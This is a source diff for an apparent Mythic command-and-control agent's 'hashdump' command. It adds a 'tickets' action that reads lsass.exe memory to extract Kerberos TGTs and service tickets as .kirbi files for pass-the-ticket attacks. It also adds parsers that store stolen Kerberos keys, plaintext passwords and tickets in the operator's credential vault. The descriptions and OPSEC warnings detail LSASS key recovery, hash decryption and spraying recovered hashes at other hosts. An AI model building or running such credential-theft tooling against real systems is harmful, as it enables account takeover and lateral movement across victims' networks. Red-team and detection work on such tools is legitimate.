@@ -37,7 +37,7 @@ func init() {
 				CLIName:          "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"dump", "insitu", "insitu-full", "auto-spray"},
+				Choices:          []string{"dump", "insitu", "insitu-full", "tickets", "auto-spray"},
 				Description:      "dump: extract local hashes from SAM (requires SYSTEM, Windows only). insitu: enumerate active logon sessions via LSA APIs in-process (requires admin, Windows only). insitu-full: open lsass.exe with PROCESS_VM_READ, sigscan lsasrv.dll for LogonSessionList, walk the linked list, parse each node's KIWI_MSV1_0_LIST_63 fields (LUID, UserName, Domain, AuthPackage, LogonType, Credentials-pointer), walk the credentials_ptr chain to capture each KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, sigscan LsaInitializeProtectedMemory_Internal to recover the IV / h3DesKey / hAesKey BCrypt key globals + raw 16-byte IV / 24-byte 3DES / 32-byte AES key bytes, AES-256-CFB / 3DES-CBC decrypt every captured ciphertext blob, and overlay the KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout to extract NT/LM/SHA hashes (Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b + 2C-ii-c, Win10 21H2 / Win11 23H2 layout) — emits `username:rid:lm:nt:::` lines compatible with the dump-action ProcessResponse credential-vault registration. Requires admin, Windows only. auto-spray: dump hashes then spray them against target hosts via cred-check.",
 				DefaultValue:     "dump",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -82,6 +82,8 @@ func init() {
 			var msg string
 			if action == "insitu" {
 				msg = "OPSEC WARNING: hashdump -action insitu calls LsaEnumerateLogonSessions/LsaGetLogonSessionData in-process. No remote handle to lsass.exe is opened (Phase 1 — LSA API only). Requires administrator privileges for full visibility across all sessions."
+			} else if action == "tickets" {
+				msg = "OPSEC WARNING: hashdump -action tickets opens lsass.exe with PROCESS_VM_READ, reads the kerberos.dll image, and sigscan for KerbGlobalLogonSessionTable. It then walks the Kerberos session list and reads raw ticket data (TGTs and service tickets) from each session. Process handle to LSASS is the highest-fidelity EDR signal. Requires administrator privileges. Exports tickets in .kirbi format (base64) for pass-the-ticket attacks."
 			} else if action == "insitu-full" {
 				msg = "OPSEC WARNING: hashdump -action insitu-full opens lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION and calls ReadProcessMemory across the lsasrv.dll image, every walked LogonSessionList node, every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings, every KIWI_MSV1_0_CREDENTIAL_LIST entry + KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope reachable from credentials_ptr (Phase 2C-ii-a), AND the IV global + h3DesKey/hAesKey KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY81 → KIWI_HARD_KEY chain reachable from LsaInitializeProtectedMemory_Internal (Phase 2C-ii-b — recovers raw 16-byte IV + 24-byte 3DES + 32-byte AES key bytes). Phase 2C-ii-c then AES-256-CFB / 3DES-CBC decrypts every captured ciphertext blob in-process and overlays the KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout to extract NT/LM/SHA hashes — output includes `username:rid:lm:nt:::` lines that the dump-action ProcessResponse parser will register in the credential vault. Process handle to LSASS is the highest-fidelity EDR signal available — equivalent to mimikatz/dumpit on most modern EDR. Requires administrator privileges; on Win11 22H2+ default RunAsPPL=2 (PPL with UEFI variable lock) blocks PROCESS_VM_READ even from SYSTEM — the agent now reads HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL+LsaCfgFlags BEFORE OpenProcess and emits a structured `lsass_protection` JSON report so PPL/Credential Guard blocks are distinguishable from layout drift. Signature + KIWI_MSV1_0_LIST_63 + CREDENTIAL_LIST + LsaInitializeProtectedMemory + PRIMARY_CREDENTIAL_10_NEW layouts calibrated for Win10 21H2 — Win11 23H2; older builds may emit 'signature not found' or report walked nodes with empty parsed_username/parsed_domain or invalid BCrypt key tags (layout drift). Decryption is the operationally-loud step — recovered hashes will appear in operator output; do NOT run on production endpoints without explicit engagement scope."
 			} else {
@@ -145,10 +147,19 @@ func init() {
 					Comment:        "hashdump (SAM)",
 				})
 			}
+			// Parse insitu-full JSON for Kerberos keys and plaintext creds
+			if idx := strings.Index(responseText, "\n{"); idx >= 0 {
+				jsonText := responseText[idx+1:]
+				kerbCreds, ptCreds := parseInsituFullCredentials(jsonText, hostname)
+				creds = append(creds, kerbCreds...)
+				creds = append(creds, ptCreds...)
+				ticketCreds := parseKerbTicketCredentials(jsonText, hostname)
+				creds = append(creds, ticketCreds...)
+			}
 			registerCredentials(processResponse.TaskData.Task.ID, creds)
 			if len(creds) > 0 {
 				logOperationEvent(processResponse.TaskData.Task.ID,
-					fmt.Sprintf("[CREDENTIAL] hashdump extracted %d SAM hashes from %s", len(creds), hostname), true)
+					fmt.Sprintf("[CREDENTIAL] hashdump extracted %d credential(s) from %s", len(creds), hostname), true)
 			}
 			return response
 		},
@@ -170,6 +181,17 @@ func init() {
 					TaskID:           taskData.Task.ID,
 					BaseArtifactType: "API Call",
 					ArtifactMessage:  "LsaEnumerateLogonSessions + LsaGetLogonSessionData (active logon session metadata from live LSASS)",
+				})
+				return response
+			}
+
+			if action == "tickets" {
+				display := "Kerberos ticket extraction (sigscan kerberos.dll + KerbGlobalLogonSessionTable walk + .kirbi export)"
+				response.DisplayParams = &display
+				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
+					TaskID:           taskData.Task.ID,
+					BaseArtifactType: "API Call",
+					ArtifactMessage:  "OpenProcess(lsass.exe, PROCESS_VM_READ) + ReadProcessMemory(kerberos.dll image) + sigscan KerbGlobalLogonSessionTable + walk Kerberos session list + extract TGTs and service tickets",
 				})
 				return response
 			}
@@ -450,7 +472,7 @@ func hashdumpSprayGroupDone(
 			successes := strings.Count(output, "SUCCESS")
 			failures := strings.Count(output, "FAILED")
 
-			status := "?"
+			var status string
 			if task.Status == "error" {
 				status = "ERROR"
 				errorCount++
@@ -520,4 +542,148 @@ func parseHashdumpEntries(text string) []hashdumpEntry {
 type hashdumpEntry struct {
 	Username string
 	Hash     string
+}
+
+// parseInsituFullCredentials extracts Kerberos keys and plaintext passwords
+// from the insitu-full JSON output and returns them as Mythic credential entries.
+func parseInsituFullCredentials(jsonText, hostname string) (kerbCreds, ptCreds []mythicrpc.MythicRPCCredentialCreateCredentialData) {
+	var summary struct {
+		Nodes []struct {
+			ParsedUserName string `json:"parsed_username"`
+			ParsedDomain   string `json:"parsed_domain"`
+			Credentials    []struct {
+				Decrypted         *insituDecryptedJSON           `json:"decrypted"`
+				AdditionalEntries []insituAdditionalEntryJSON `json:"additional_entries"`
+			} `json:"credentials"`
+		} `json:"nodes"`
+	}
+	if err := json.Unmarshal([]byte(jsonText), &summary); err != nil {
+		return nil, nil
+	}
+
+	for _, node := range summary.Nodes {
+		username := node.ParsedUserName
+		domain := node.ParsedDomain
+		if username == "" {
+			continue
+		}
+		account := username
+		if domain != "" {
+			account = domain + "\\" + username
+		}
+
+		for _, cred := range node.Credentials {
+			kerbCreds = append(kerbCreds, extractKerbKeysFromDecrypted(cred.Decrypted, account, hostname)...)
+			ptCreds = append(ptCreds, extractPlaintextFromDecrypted(cred.Decrypted, account, hostname)...)
+			for _, ae := range cred.AdditionalEntries {
+				kerbCreds = append(kerbCreds, extractKerbKeysFromDecrypted(ae.Decrypted, account, hostname)...)
+				ptCreds = append(ptCreds, extractPlaintextFromDecrypted(ae.Decrypted, account, hostname)...)
+			}
+		}
+	}
+	return kerbCreds, ptCreds
+}
+
+type insituDecryptedJSON struct {
+	KerberosKeys      []insituKerbKeyJSON `json:"kerberos_keys"`
+	PlaintextPassword string              `json:"plaintext_password"`
+	PlaintextUser     string              `json:"plaintext_user"`
+	PlaintextDomain   string              `json:"plaintext_domain"`
+	CredentialName    string              `json:"credential_name"`
+}
+
+type insituAdditionalEntryJSON struct {
+	Decrypted *insituDecryptedJSON `json:"decrypted"`
+}
+
+type insituKerbKeyJSON struct {
+	EncType string `json:"enc_type"`
+	KeyHex  string `json:"key_hex"`
+}
+
+func extractKerbKeysFromDecrypted(dec *insituDecryptedJSON, account, hostname string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
+	if dec == nil || len(dec.KerberosKeys) == 0 {
+		return nil
+	}
+	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+	for _, key := range dec.KerberosKeys {
+		if key.KeyHex == "" {
+			continue
+		}
+		creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+			CredentialType: "hash",
+			Realm:          hostname,
+			Account:        account,
+			Credential:     key.EncType + ":" + key.KeyHex,
+			Comment:        "Kerberos " + key.EncType + " (LSASS insitu-full)",
+		})
+	}
+	return creds
+}
+
+func extractPlaintextFromDecrypted(dec *insituDecryptedJSON, account, hostname string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
+	if dec == nil || dec.PlaintextPassword == "" {
+		return nil
+	}
+	credName := dec.CredentialName
+	if credName == "" {
+		credName = "LSASS"
+	}
+	return []mythicrpc.MythicRPCCredentialCreateCredentialData{
+		{
+			CredentialType: "plaintext",
+			Realm:          hostname,
+			Account:        account,
+			Credential:     dec.PlaintextPassword,
+			Comment:        credName + " plaintext (LSASS insitu-full)",
+		},
+	}
+}
+
+func parseKerbTicketCredentials(jsonText, hostname string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
+	var report struct {
+		Sessions []struct {
+			UserName string `json:"username"`
+			Domain   string `json:"domain"`
+			Tickets  []struct {
+				ListName    string `json:"list_name"`
+				ServiceName string `json:"service_name"`
+				ClientName  string `json:"client_name"`
+				Domain      string `json:"domain"`
+				KirbiB64    string `json:"kirbi_b64"`
+				EndTime     string `json:"end_time"`
+			} `json:"tickets"`
+		} `json:"sessions"`
+	}
+	if err := json.Unmarshal([]byte(jsonText), &report); err != nil {
+		return nil
+	}
+	if len(report.Sessions) == 0 {
+		return nil
+	}
+
+	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+	for _, sess := range report.Sessions {
+		for _, t := range sess.Tickets {
+			if t.KirbiB64 == "" {
+				continue
+			}
+			account := t.ClientName
+			if sess.Domain != "" && account != "" {
+				account = sess.Domain + "\\" + account
+			}
+			comment := fmt.Sprintf("Kerberos %s → %s (LSASS tickets)", t.ListName, t.ServiceName)
+			if t.EndTime != "" {
+				comment += " expires " + t.EndTime
+			}
+			creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+				CredentialType: "ticket",
+				Realm:          t.Domain,
+				Account:        account,
+				Credential:     t.KirbiB64,
+				Comment:        comment,
+			})
+		}
+	}
+	return creds
 }
